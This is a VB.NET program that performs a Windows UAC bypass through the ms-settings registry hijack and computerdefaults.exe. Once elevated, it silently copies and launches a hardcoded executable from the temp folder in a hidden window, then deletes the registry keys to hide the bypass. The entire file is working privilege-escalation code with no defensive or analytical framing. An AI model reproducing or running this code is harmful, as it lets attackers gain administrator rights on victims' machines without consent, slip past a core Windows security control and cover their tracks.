Imports System
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Management
Imports System.Security.Principal

Public Class Bypass
        Public Shared Sub UAC()
            Dim windowsPrincipal As WindowsPrincipal = New WindowsPrincipal(WindowsIdentity.GetCurrent())

            If Not windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator) Then
                Bypass.Z("Classes")
                Bypass.Z("Classes\ms-settings")
                Bypass.Z("Classes\ms-settings\shell")
                Bypass.Z("Classes\ms-settings\shell\open")
                Dim registryKey As RegistryKey = Bypass.Z("Classes\ms-settings\shell\open\command")
                Dim cpath As String = System.Reflection.Assembly.GetExecutingAssembly().Location
                registryKey.SetValue("", cpath, RegistryValueKind.String)
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord)
                registryKey.Close()

                Try
                    Process.Start(New ProcessStartInfo With {
                        .CreateNoWindow = True,
                        .UseShellExecute = False,
                        .FileName = "cmd.exe",
                        .Arguments = "/c start computerdefaults.exe"
                    })
                Catch
                End Try

                Process.GetCurrentProcess().Kill()
            Else
                Dim registryKey2 As RegistryKey = Bypass.Z("Classes\ms-settings\shell\open\command")
                registryKey2.SetValue("", "", RegistryValueKind.String)
            End If
        End Sub

        Public Shared Function Z(ByVal x As String) As RegistryKey
            Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\" & x, True)
            Dim flag As Boolean = Not Bypass.checksubkey(registryKey)

            If flag Then
                registryKey = Registry.CurrentUser.CreateSubKey("Software\" & x)
            End If

            Return registryKey
        End Function

        Public Shared Function checksubkey(ByVal k As RegistryKey) As Boolean
            Dim flag As Boolean = k Is Nothing
            Return Not flag
        End Function

        Private Shared Function GetMngObj(ByVal className As String) As ManagementObject
            Dim managementClass As ManagementClass = New ManagementClass(className)

            Try

                For Each managementBaseObject As ManagementBaseObject In managementClass.GetInstances()
                    Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
                    Dim flag As Boolean = managementObject IsNot Nothing

                    If flag Then
                        Return managementObject
                    End If
                Next

            Catch
            End Try

            Return Nothing
        End Function

        Public Shared Function GetOsVer() As String
            Dim result As String

            Try
                Dim mngObj As ManagementObject = Bypass.GetMngObj("Win32_OperatingSystem")
                Dim flag As Boolean = mngObj Is Nothing

                If flag Then
                    result = String.Empty
                Else
                    result = (TryCast(mngObj("Version"), String))
                End If

            Catch ex As Exception
                result = String.Empty
            End Try

            Return result
        End Function
    End Class

    Module Program
        Function IsAdministrator() As Boolean
            Dim identity = WindowsIdentity.GetCurrent()
            Dim principal = New WindowsPrincipal(identity)
            Return principal.IsInRole(WindowsBuiltInRole.Administrator)
        End Function

    Sub Main()
        Try

            If Not IsAdministrator() Then
                Bypass.UAC()
            ElseIf IsAdministrator() Then
                Dim FileName As String = "WindowsFormsApp1.exe" ' 파일 이름 / File Name
                Dim FilePath As String = "C:\pc\PC\Downloads\WindowsFormsApp1.exe" ' 파일 경로 / File Path
                My.Computer.FileSystem.CopyFile(FilePath, System.IO.Path.GetTempPath & FileName, overwrite:=True)
                Dim process As Process = New Process()
                Dim startInfo As ProcessStartInfo = New ProcessStartInfo()
                startInfo.WindowStyle = ProcessWindowStyle.Hidden
                startInfo.FileName = "cmd.exe"
                startInfo.Arguments = "/c start " & System.IO.Path.GetTempPath & FileName
                process.StartInfo = startInfo
                process.Start()
                Dim uac_clean As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Classes\ms-settings", True)
                uac_clean.DeleteSubKeyTree("shell")
                uac_clean.Close()
            End If

        Catch
            Environment.[Exit](0)
        End Try
    End Sub
End Module